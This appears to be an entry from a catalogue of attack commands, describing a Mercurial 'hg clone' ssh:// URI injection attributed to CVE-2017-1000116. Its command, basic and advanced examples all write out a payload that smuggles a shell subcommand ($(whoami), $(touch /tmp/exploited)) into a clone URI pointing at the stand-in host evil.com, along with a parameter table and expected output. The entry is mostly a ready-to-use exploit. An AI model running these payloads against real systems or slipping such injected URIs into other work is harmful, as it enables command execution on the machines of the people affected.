---
data: 'hg clone ''ssh://hg@evil.com/repo/$(whoami)'''
tags:
  - rce
  - mercurial
type: command
executor: bash
platforms:
  - Linux
  - Unix-like
id: 18053bc9-62c3-4522-804c-e661b088636b
created_at: '2025-12-14T17:23:42.305Z'
updated_at: '2025-12-14T17:23:42.305Z'
verified: false
validated: true
submitted: true
---
# hg-clone-malicious-uri

## Command

```bash
hg clone 'ssh://hg@evil.com/repo/$(whoami)'
```

## Description

Clones a Mercurial repository with a malicious ssh:// URI to inject and execute OS commands (CVE-2017-1000116).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `hg clone` | Mercurial clone command | Yes |
| `'ssh://hg@evil.com/repo/$(whoami)'` | URI with payload | Yes |

## Examples

### Basic Usage

```bash
hg clone 'ssh://hg@evil.com/repo/$(whoami)'
```

### Advanced Usage

```bash
hg clone 'ssh://hg@evil.com/repo$(touch /tmp/exploited)'
```

## Expected Output

cloning... $(whoami): user

## Related

- [[commands/git-clone-malicious-uri]]
- [[procedures/Exploit-Mercurial-ssh-URI-Injection]]
